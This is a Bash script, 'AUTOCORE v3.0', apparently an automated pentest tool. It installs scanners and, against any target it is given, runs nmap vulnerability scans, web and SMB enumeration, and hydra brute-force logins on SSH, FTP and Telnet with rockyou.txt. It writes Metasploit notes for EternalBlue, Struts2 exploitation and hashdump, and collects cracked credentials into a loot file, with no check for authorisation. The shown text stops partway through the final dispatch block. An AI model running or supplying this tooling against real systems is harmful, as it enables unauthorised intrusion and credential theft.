#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════╗
#  AUTOCORE v3.0 — Universal Pentest Orchestrator
#  Author  : Ch Manan (OBLIQ_CORE) | Handle: cynex
#  GitHub  : https://github.com/Abdul-Manan-C
#  Platform: Kali · Fedora · Arch · Debian · Termux · NetHunter
# ╚══════════════════════════════════════════════════════════════════╝

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COLORS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
R='\033[0;31m' C='\033[0;36m' G='\033[0;32m' Y='\033[1;33m'
M='\033[0;35m' B='\033[0;34m' W='\033[1;37m' D='\033[2m'
RESET='\033[0m' BOLD='\033[1m'

ok()    { echo -e "  ${G}✔${RESET}  $1"; }
err()   { echo -e "  ${R}✘${RESET}  $1"; }
warn()  { echo -e "  ${Y}!${RESET}  $1"; }
info()  { echo -e "  ${C}→${RESET}  $1"; }
run()   { echo -e "  ${M}>>${RESET} $1"; }
save()  { echo -e "  ${B}💾${RESET} Saved: ${D}$1${RESET}"; }
box()   { echo -e "\n${C}╔══════════════════════════════════════════════════════╗${RESET}"
          echo -e "${C}║${RESET}  ${W}${BOLD}$1${RESET}"
          echo -e "${C}╚══════════════════════════════════════════════════════╝${RESET}"; }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# OS DETECTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
detect_os() {
    [[ -d /data/data/com.termux || "$PREFIX" == *termux* ]] && { echo "termux"; return; }
    [[ -f /etc/nethunter-release || ( -f /etc/kali-release && -n "$ANDROID_ROOT" ) ]] && { echo "nethunter"; return; }
    [[ -f /etc/os-release ]] && . /etc/os-release
    case "${ID,,}" in
        kali|parrot)                    echo "debian" ;;
        ubuntu|debian|linuxmint|pop)    echo "debian" ;;
        fedora)                         echo "fedora" ;;
        arch|manjaro|endeavouros|garuda) echo "arch" ;;
        *)
            case "${ID_LIKE,,}" in
                *debian*|*ubuntu*)  echo "debian" ;;
                *arch*)             echo "arch"   ;;
                *fedora*|*rhel*)    echo "fedora"  ;;
                *)                  echo "debian"  ;;  # safe fallback
            esac ;;
    esac
}

OS=$(detect_os)
case "$OS" in
    termux|nethunter) SUDO="";      SCAN="-sT"; IS_MOBILE=true  ;;
    *)                SUDO="sudo";  SCAN="-sS"; IS_MOBILE=false ;;
esac

# NetHunter: test if SYN scan available
[[ "$OS" == "nethunter" ]] && nmap -sS --version-trace 127.0.0.1 &>/dev/null && SCAN="-sS"

# Wordlist paths
if [[ "$IS_MOBILE" == true ]]; then
    WL_DIR="$HOME/wordlists"
else
    WL_DIR="/usr/share/wordlists"
fi
WL_DIRS="$WL_DIR/dirb/common.txt";       [[ ! -f "$WL_DIRS" ]] && WL_DIRS="$WL_DIR/common.txt"
WL_PASS="$WL_DIR/rockyou.txt"
WL_USER="$WL_DIR/metasploit/unix_users.txt"; [[ ! -f "$WL_USER" ]] && WL_USER="$WL_DIR/unix_users.txt"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BANNER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
banner() {
echo -e "${R}"
cat << 'EOF'
  ▄▄▄       █    ██ ▄▄▄█████▓ ▒█████   ▄████▄   ▒█████   ██▀███  ▓█████
 ▒████▄     ██  ▓██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▓█   ▀
 ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██░  ██▒▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒███
 ░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ▒██   ██░▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒▓█  ▄
  ▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░ ████▓▒░▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▒
  ▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░
   ▒   ▒▒ ░░░▒░ ░ ░     ░      ░ ▒ ▒░   ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░
   ░   ▒    ░░░ ░ ░   ░      ░ ░ ░ ▒  ░        ░ ░ ░ ▒    ░░   ░    ░
       ░  ░   ░                  ░ ░  ░ ░          ░ ░     ░        ░  ░
EOF
echo -e "${RESET}"
echo -e "${C}${BOLD}  ╔══════════════════════════════════════════════════════════════╗${RESET}"
echo -e "${C}${BOLD}  ║   AUTOCORE v3.0 · Universal · ${OS^^} · cynex / OBLIQ_CORE   ║${RESET}"
echo -e "${C}${BOLD}  ╚══════════════════════════════════════════════════════════════╝${RESET}"
echo -e "${D}  github.com/Abdul-Manan-C | Ch Manan${RESET}\n"
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TOOL HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
has()     { command -v "$1" &>/dev/null; }
runtool() {
    local t="$1"; shift
    has "$t" && { run "$t $*"; "$t" "$@" 2>/dev/null; } || warn "$t not found — skipping"
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# INSTALL — platform-aware
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
install_tools() {
    box "AUTOCORE SETUP — Installing Tools"
    info "Platform: ${OS^^}"
    echo ""

    case "$OS" in
        debian)
            info "Updating apt..."
            sudo apt update -qq 2>/dev/null
            info "Installing tools..."
            sudo apt install -y nmap hydra nikto whatweb gobuster curl wget whois \
                dnsutils smbclient enum4linux dirb nano git 2>/dev/null
            # nikto fallback
            has nikto || {
                warn "nikto apt failed — cloning from git..."
                sudo git clone https://github.com/sullo/nikto /opt/nikto 2>/dev/null
                sudo ln -sf /opt/nikto/program/nikto.pl /usr/local/bin/nikto
                sudo chmod +x /opt/nikto/program/nikto.pl
            }
            # rockyou extract
            [[ -f /usr/share/wordlists/rockyou.txt.gz && ! -f /usr/share/wordlists/rockyou.txt ]] && \
                sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz && ok "rockyou.txt extracted"
            ;;
        fedora)
            sudo dnf install -y nmap hydra nikto curl wget whois bind-utils \
                samba-client nano git gobuster perl 2>/dev/null
            has enum4linux || {
                wget -q https://raw.githubusercontent.com/CiscoCXSecurity/enum4linux/master/enum4linux.pl \
                    -O /tmp/e4l.pl && sudo cp /tmp/e4l.pl /usr/local/bin/enum4linux && \
                    sudo chmod +x /usr/local/bin/enum4linux && ok "enum4linux installed"
            }
            has whatweb || sudo gem install whatweb 2>/dev/null
            ;;
        arch)
            local PM="sudo pacman"; has yay && PM="yay"
            $PM -S --noconfirm nmap hydra nikto whatweb gobuster curl wget \
                whois smbclient enum4linux nano git 2>/dev/null
            ;;
        termux|nethunter)
            pkg update -y 2>/dev/null
            for t in nmap hydra curl wget nikto git nano whois dnsutils; do
                has "$t" && ok "$t ok" || pkg install -y "$t" 2>/dev/null && ok "$t installed" || warn "$t failed"
            done
            ;;
    esac

    # Wordlists
    echo ""
    info "Checking wordlists..."
    mkdir -p "$WL_DIR"
    [[ ! -f "$WL_DIRS" ]] && {
        wget -q "https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt" \
            -O "$WL_DIR/common.txt" 2>/dev/null && WL_DIRS="$WL_DIR/common.txt" && ok "common.txt downloaded"
    } || ok "common.txt ready"

    [[ ! -f "$WL_PASS" ]] && {
        warn "rockyou.txt missing"
        [[ "$IS_MOBILE" == false ]] && sudo apt install -y wordlists 2>/dev/null
        [[ -f /usr/share/wordlists/rockyou.txt.gz ]] && sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
        [[ -f "$WL_PASS" ]] && ok "rockyou.txt ready" || warn "rockyou.txt still missing — brute phase will skip"
    } || ok "rockyou.txt ready"

    [[ ! -f "$WL_USER" ]] && {
        printf "root\nadmin\nuser\ntest\nguest\nftp\npi\nwww\nubuntu\nkali\n" > "$WL_DIR/unix_users.txt"
        WL_USER="$WL_DIR/unix_users.txt"; ok "unix_users.txt created"
    } || ok "unix_users.txt ready"

    # Verify
    echo ""
    info "Tool verification:"
    local PASS=0 FAIL=0
    for t in nmap hydra nikto whatweb gobuster curl wget whois host smbclient enum4linux; do
        has "$t" && { ok "$t"; ((PASS++)); } || { warn "$t — missing"; ((FAIL++)); }
    done

    echo ""
    echo -e "${G}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${G}║${RESET}  ${G}✔${RESET}  ${W}${BOLD}SETUP COMPLETE — $PASS installed · $FAIL missing${RESET}"
    echo -e "${G}╚══════════════════════════════════════════════════════╝${RESET}"
    exit 0
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SELF INSTALL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
self_install() {
    SELF="$(realpath "$0")"
    if [[ "$IS_MOBILE" == true ]]; then
        cp "$SELF" "$PREFIX/bin/autocore" && chmod +x "$PREFIX/bin/autocore"
        ok "Installed → $PREFIX/bin/autocore"
    else
        sudo cp "$SELF" /usr/local/bin/autocore && sudo chmod 755 /usr/local/bin/autocore
        ok "Installed → /usr/local/bin/autocore"
    fi
    ok "Run: autocore <IP>"
    exit 0
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLEAR SESSIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
clear_sessions() {
    local SESSIONS=(autocore_*/); local COUNT=${#SESSIONS[@]}
    [[ $COUNT -eq 0 || ! -d "${SESSIONS[0]}" ]] && { warn "No sessions found."; return; }
    echo ""
    echo -e "  ${Y}Found $COUNT session(s):${RESET}"
    for s in "${SESSIONS[@]}"; do echo -e "    ${D}$s${RESET}"; done
    echo ""
    read -rp "  Delete all? [y/N]: " CONFIRM
    [[ "${CONFIRM,,}" == "y" ]] && rm -rf autocore_*/ && ok "All sessions deleted." || info "Cancelled."
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LIST SESSIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
list_sessions() {
    local SESSIONS=(autocore_*/)
    [[ ! -d "${SESSIONS[0]}" ]] && { warn "No sessions found."; return; }
    echo ""
    echo -e "  ${W}${BOLD}Past Sessions:${RESET}"
    for s in "${SESSIONS[@]}"; do
        local RPT="$s/REPORT_*.txt"
        echo -e "    ${C}▸${RESET} ${D}$s${RESET}"
        ls $RPT 2>/dev/null | while read r; do echo -e "      ${D}→ $r${RESET}"; done
    done
    echo ""
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# INTERACTIVE MENU
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
menu() {
    banner
    echo -e "  ${W}${BOLD}MAIN MENU${RESET}\n"
    echo -e "  ${C}[1]${RESET} Full Auto Scan          — All phases"
    echo -e "  ${C}[2]${RESET} Web Enum Only            — Nikto, Gobuster, WhatWeb"
    echo -e "  ${C}[3]${RESET} SMB Enum Only            — enum4linux, smbclient"
    echo -e "  ${C}[4]${RESET} Brute Force Only         — Hydra SSH/FTP/Telnet"
    echo -e "  ${C}[5]${RESET} Stealth Scan             — T2, slow & quiet"
    echo -e "  ${C}[6]${RESET} Quick Scan               — Top 1000 ports only"
    echo -e "  ${Y}[7]${RESET} Install Tools            — Auto for ${OS^^}"
    echo -e "  ${Y}[8]${RESET} List Past Sessions"
    echo -e "  ${Y}[9]${RESET} Clear All Sessions"
    echo -e "  ${Y}[i]${RESET} Install AUTOCORE to PATH"
    echo -e "  ${R}[0]${RESET} Exit\n"

    read -rp "  $(echo -e "${C}Choose [0-9/i]:${RESET} ")" OPT
    echo ""

    case "$OPT" in
        1|2|3|4|5|6)
            read -rp "  $(echo -e "${W}Target IP/Host:${RESET} ")" TARGET
            [[ -z "$TARGET" ]] && { err "No target entered."; menu; return; }
            case "$OPT" in
                1) MODE="--full"    ;;
                2) MODE="--web"     ;;
                3) MODE="--smb"     ;;
                4) MODE="--brute"   ;;
                5) MODE="--stealth" ;;
                6) MODE="--quick"   ;;
            esac
            ;;
        7) install_tools ;;
        8) list_sessions; menu ;;
        9) clear_sessions; menu ;;
        i) self_install ;;
        0) echo -e "\n  ${D}Goodbye, OBLIQ_CORE.${RESET}\n"; exit 0 ;;
        *) err "Invalid option."; menu ;;
    esac
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ARG PARSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TARGET=""; MODE="--full"

case "$1" in
    ""|-m|--menu)   banner; menu ;;
    --setup)        banner; install_tools ;;
    --install)      self_install ;;
    --sessions)     list_sessions; exit 0 ;;
    --clear)        clear_sessions; exit 0 ;;
    --help|-h)
        banner
        echo -e "  ${W}Usage:${RESET}"
        echo -e "  autocore                  — Interactive menu"
        echo -e "  autocore <IP>             — Full scan"
        echo -e "  autocore <IP> --web       — Web only"
        echo -e "  autocore <IP> --smb       — SMB only"
        echo -e "  autocore <IP> --brute     — Brute force only"
        echo -e "  autocore <IP> --stealth   — Slow/quiet"
        echo -e "  autocore <IP> --quick     — Top 1000 ports"
        echo -e "  autocore --setup          — Install tools"
        echo -e "  autocore --install        — Add to PATH"
        echo -e "  autocore --sessions       — List past sessions"
        echo -e "  autocore --clear          — Delete all sessions"
        exit 0 ;;
    -*)
        banner; err "Unknown option: $1"; exit 1 ;;
    *)
        TARGET="$1"; MODE="${2:---full}" ;;
esac

[[ -z "$TARGET" ]] && { err "No target."; exit 1; }

banner

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TS=$(date +%Y%m%d_%H%M%S)
SESSION="autocore_${TARGET}_${TS}"
mkdir -p "$SESSION"/{nmap,web,nikto,smb,hydra,metasploit,whatweb,enum,loot}
ok "Session : $SESSION"
ok "Platform: ${OS^^} | Scan: $SCAN | Mode: $MODE"
echo ""

OPEN_PORTS=""
HAS_WEB=false; HAS_SMB=false; HAS_SSH=false; HAS_FTP=false; HAS_TELNET=false

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 1 — RECON
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase_recon() {
    box "PHASE 1 — RECON"
    {
        echo "=== PING ===" && ping -c 3 "$TARGET" 2>/dev/null
        echo -e "\n=== WHOIS ===" && runtool whois "$TARGET"
        echo -e "\n=== HOST ===" && runtool host "$TARGET"
        echo -e "\n=== NSLOOKUP ===" && runtool nslookup "$TARGET"
    } | tee "$SESSION/enum/recon.txt"
    save "$SESSION/enum/recon.txt"
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SERVICE FLAG SETTER (shared function — no duplicate code)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
set_flags() {
    local FILE="$1"
    grep -q "^80/\|^443/\|^8080/\|^8443/" "$FILE" 2>/dev/null && HAS_WEB=true
    grep -q "^445/\|^139/"                 "$FILE" 2>/dev/null && HAS_SMB=true
    grep -q "^22/"                          "$FILE" 2>/dev/null && HAS_SSH=true
    grep -q "^21/"                          "$FILE" 2>/dev/null && HAS_FTP=true
    grep -q "^23/"                          "$FILE" 2>/dev/null && HAS_TELNET=true
    [[ "$HAS_WEB"    == true ]] && ok "Web detected (HTTP/HTTPS)"
    [[ "$HAS_SMB"    == true ]] && ok "SMB detected"
    [[ "$HAS_SSH"    == true ]] && ok "SSH detected (22)"
    [[ "$HAS_FTP"    == true ]] && ok "FTP detected (21)"
    [[ "$HAS_TELNET" == true ]] && ok "Telnet detected (23)"
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 2 — NMAP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase_nmap() {
    box "PHASE 2 — NMAP PORT SCAN"
    [[ "$IS_MOBILE" == true ]] && warn "Mobile — using TCP connect (-sT)"

    # Quick scan
    run "nmap -Pn $SCAN -T4 --top-ports 1000 $TARGET"
    $SUDO nmap -Pn $SCAN -T4 --top-ports 1000 "$TARGET" -oN "$SESSION/nmap/nmap_1_quick.txt" 2>/dev/null
    save "$SESSION/nmap/nmap_1_quick.txt"

    # Full port scan
    run "nmap -Pn $SCAN -T4 -p- $TARGET"
    $SUDO nmap -Pn $SCAN -T4 -p- "$TARGET" -oN "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null
    save "$SESSION/nmap/nmap_2_fullports.txt"

    OPEN_PORTS=$(grep "^[0-9]" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null \
        | grep "open" | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
    ok "Open ports: ${OPEN_PORTS:-none}"

    if [[ -n "$OPEN_PORTS" ]]; then
        # Service detection
        run "nmap -Pn $SCAN -sV -sC -p$OPEN_PORTS $TARGET"
        $SUDO nmap -Pn $SCAN -sV -sC -p"$OPEN_PORTS" "$TARGET" -oN "$SESSION/nmap/nmap_3_services.txt" 2>/dev/null
        save "$SESSION/nmap/nmap_3_services.txt"

        # Vuln scripts
        run "nmap -Pn --script vuln -p$OPEN_PORTS $TARGET"
        $SUDO nmap -Pn --script vuln -p"$OPEN_PORTS" "$TARGET" -oN "$SESSION/nmap/nmap_4_vulns.txt" 2>/dev/null
        save "$SESSION/nmap/nmap_4_vulns.txt"

        # OS detect (desktop only)
        [[ "$IS_MOBILE" == false ]] && {
            run "nmap -Pn -O $TARGET"
            $SUDO nmap -Pn -O "$TARGET" -oN "$SESSION/nmap/nmap_5_os.txt" 2>/dev/null
            save "$SESSION/nmap/nmap_5_os.txt"
        }
    fi

    set_flags "$SESSION/nmap/nmap_2_fullports.txt"
}

# Quick-only scan (no -p-)
phase_quick() {
    box "PHASE 2 — QUICK SCAN (Top 1000)"
    run "nmap -Pn $SCAN -T4 --top-ports 1000 $TARGET"
    $SUDO nmap -Pn $SCAN -T4 --top-ports 1000 "$TARGET" -oN "$SESSION/nmap/nmap_1_quick.txt" 2>/dev/null
    save "$SESSION/nmap/nmap_1_quick.txt"
    OPEN_PORTS=$(grep "^[0-9]" "$SESSION/nmap/nmap_1_quick.txt" 2>/dev/null \
        | grep "open" | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
    ok "Open ports: ${OPEN_PORTS:-none}"
    set_flags "$SESSION/nmap/nmap_1_quick.txt"
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 3 — WEB
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase_web() {
    box "PHASE 3 — WEB ENUMERATION"
    [[ "$HAS_WEB" != true ]] && warn "No web service detected — skipping" && return

    local WEBPORT="80"
    grep -q "^443/" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && WEBPORT="443"
    local PROTO="http"; [[ "$WEBPORT" == "443" ]] && PROTO="https"
    local URL="${PROTO}://${TARGET}"
    info "Target URL: $URL"

    runtool whatweb "$URL" | tee "$SESSION/whatweb/whatweb_1.txt" 2>/dev/null
    save "$SESSION/whatweb/whatweb_1.txt"

    runtool nikto -h "$URL" -o "$SESSION/nikto/nikto_1.txt" 2>/dev/null
    save "$SESSION/nikto/nikto_1.txt"

    if has gobuster && [[ -f "$WL_DIRS" ]]; then
        run "gobuster dir -u $URL -w $WL_DIRS"
        gobuster dir -u "$URL" -w "$WL_DIRS" -o "$SESSION/web/gobuster_1_dirs.txt" 2>/dev/null
        save "$SESSION/web/gobuster_1_dirs.txt"
        gobuster dir -u "$URL" -w "$WL_DIRS" -x php,txt,html,js,bak \
            -o "$SESSION/web/gobuster_2_files.txt" 2>/dev/null
        save "$SESSION/web/gobuster_2_files.txt"
    else
        warn "gobuster or wordlist missing — skipping dir enum"
    fi

    curl -skI "$URL" 2>/dev/null | tee "$SESSION/web/headers_1.txt"; save "$SESSION/web/headers_1.txt"
    curl -sk "${URL}/robots.txt" 2>/dev/null | tee "$SESSION/web/robots_1.txt"; save "$SESSION/web/robots_1.txt"
    curl -sk "${URL}/sitemap.xml" 2>/dev/null | tee "$SESSION/web/sitemap_1.txt"; save "$SESSION/web/sitemap_1.txt"
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 4 — SMB
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase_smb() {
    box "PHASE 4 — SMB ENUMERATION"
    [[ "$HAS_SMB" != true ]] && warn "No SMB detected — skipping" && return

    if [[ "$IS_MOBILE" == false ]]; then
        runtool enum4linux -a "$TARGET" | tee "$SESSION/smb/enum4linux_1_full.txt" 2>/dev/null
        save "$SESSION/smb/enum4linux_1_full.txt"
        has smbclient && {
            smbclient -L "//${TARGET}" -N 2>/dev/null | tee "$SESSION/smb/smb_1_shares.txt"
            save "$SESSION/smb/smb_1_shares.txt"
        }
    else
        warn "enum4linux/smbclient not on mobile — nmap SMB scripts only"
    fi

    $SUDO nmap -Pn -p 445,139 --script smb-vuln*,smb-enum* "$TARGET" \
        -oN "$SESSION/smb/nmap_smb_scripts.txt" 2>/dev/null
    save "$SESSION/smb/nmap_smb_scripts.txt"
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 5 — BRUTE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase_brute() {
    box "PHASE 5 — BRUTE FORCE"
    has hydra || { warn "hydra not installed — skipping"; return; }
    [[ -f "$WL_PASS" ]] || { warn "rockyou.txt not found — skipping"; return; }
    [[ -f "$WL_USER" ]] || { warn "userlist not found — skipping"; return; }

    [[ "$HAS_SSH"    == true ]] && {
        run "hydra SSH $TARGET"
        hydra -L "$WL_USER" -P "$WL_PASS" "$TARGET" ssh \
            -o "$SESSION/hydra/hydra_1_ssh.txt" 2>/dev/null
        save "$SESSION/hydra/hydra_1_ssh.txt"
    }
    [[ "$HAS_FTP"    == true ]] && {
        run "hydra FTP $TARGET"
        hydra -L "$WL_USER" -P "$WL_PASS" "$TARGET" ftp \
            -o "$SESSION/hydra/hydra_2_ftp.txt" 2>/dev/null
        save "$SESSION/hydra/hydra_2_ftp.txt"
    }
    [[ "$HAS_TELNET" == true ]] && {
        run "hydra Telnet $TARGET"
        hydra -L "$WL_USER" -P "$WL_PASS" "$TARGET" telnet \
            -o "$SESSION/hydra/hydra_3_telnet.txt" 2>/dev/null
        save "$SESSION/hydra/hydra_3_telnet.txt"
    }
    [[ "$HAS_WEB" == true ]] && cat > "$SESSION/hydra/hydra_4_http_template.txt" << EOF
# HTTP Brute Template — edit and run manually
# hydra -L users.txt -P rockyou.txt $TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
# hydra -L users.txt -P rockyou.txt $TARGET http-get /admin
EOF
    [[ "$HAS_SSH" == false && "$HAS_FTP" == false && "$HAS_TELNET" == false ]] && \
        warn "No brutable services detected (SSH/FTP/Telnet)"
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 6 — MSF NOTES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase_msf() {
    box "PHASE 6 — METASPLOIT NOTES"
    [[ "$IS_MOBILE" == true ]] && warn "Metasploit unavailable on mobile — notes only"
    cat > "$SESSION/metasploit/metasploit_notes.txt" << EOF
# AUTOCORE — Metasploit Notes | Target: $TARGET | $(date)

msfconsole

# Scan
use auxiliary/scanner/portscan/tcp; set RHOSTS $TARGET; run

# SMB
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $TARGET; set LHOST <your_ip>; run

# Web
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS $TARGET; run

# Post
use post/multi/recon/local_exploit_suggester
use post/linux/gather/hashdump

# Useful scanners
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/http_header
EOF
    save "$SESSION/metasploit/metasploit_notes.txt"
    ok "MSF notes generated"
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 7 — REPORT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase_report() {
    box "PHASE 7 — FINAL REPORT"
    local RFILE="$SESSION/REPORT_${TARGET}.txt"
    local LFILE="$SESSION/loot/loot_summary.txt"

    local CREDS VULNS
    CREDS=$(grep -r "login:" "$SESSION/hydra/" 2>/dev/null | grep -v template | head -20)
    VULNS=$(grep -i "VULNERABLE\|CVE" "$SESSION/nmap/nmap_4_vulns.txt" 2>/dev/null | head -20)

    {
        echo "╔══════════════════════════════════════════════════════╗"
        echo "║         AUTOCORE v3.0 — PENTEST REPORT              ║"
        echo "╠══════════════════════════════════════════════════════╣"
        echo "║  Target   : $TARGET"
        echo "║  Platform : ${OS^^}"
        echo "║  Session  : $SESSION"
        echo "║  Date     : $(date)"
        echo "╚══════════════════════════════════════════════════════╝"
        echo ""
        echo "=== OPEN PORTS ==="
        [[ -n "$OPEN_PORTS" ]] \
            && echo "$OPEN_PORTS" | tr ',' '\n' | grep -v '^$' | sed 's/^/  - /' \
            || echo "  None found"
        echo ""
        echo "=== DETECTED SERVICES ==="
        [[ "$HAS_WEB"    == true ]] && echo "  ✔ Web (HTTP/HTTPS)"
        [[ "$HAS_SMB"    == true ]] && echo "  ✔ SMB"
        [[ "$HAS_SSH"    == true ]] && echo "  ✔ SSH"
        [[ "$HAS_FTP"    == true ]] && echo "  ✔ FTP"
        [[ "$HAS_TELNET" == true ]] && echo "  ✔ Telnet"
        [[ "$HAS_WEB$HAS_SMB$HAS_SSH$HAS_FTP$HAS_TELNET" == "falsefalsefalsefalsefalse" ]] \
            && echo "  None detected"
        echo ""
        if [[ -n "$VULNS" ]]; then
            echo "=== VULNERABILITIES DETECTED ==="
            echo "$VULNS"
            echo ""
        fi
        if [[ -n "$CREDS" ]]; then
            echo "=== CREDENTIALS FOUND ==="
            echo "$CREDS"
            echo ""
        fi
        echo "=== OUTPUT FILES ==="
        find "$SESSION" -type f | sort | sed 's/^/  /'
    } | tee "$RFILE" "$LFILE"

    save "$RFILE"; save "$LFILE"

    echo -e "\n${G}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${G}║${RESET}  ${G}✔${RESET}  ${W}${BOLD}AUTOCORE COMPLETE${RESET}"
    echo -e "${G}╠══════════════════════════════════════════════════════╣${RESET}"
    echo -e "${G}║${RESET}  ${D}Session : $SESSION${RESET}"
    echo -e "${G}║${RESET}  ${D}Report  : $RFILE${RESET}"
    echo -e "${G}║${RESET}  ${D}Loot    : $LFILE${RESET}"
    echo -e "${G}╚══════════════════════════════════════════════════════╝${RESET}\n"
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RUN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case "$MODE" in
    --web)
        phase_recon; phase_nmap; phase_web; phase_report ;;
    --smb)
        phase_recon; phase_nmap; phase_smb; phase_report ;;
    --brute)
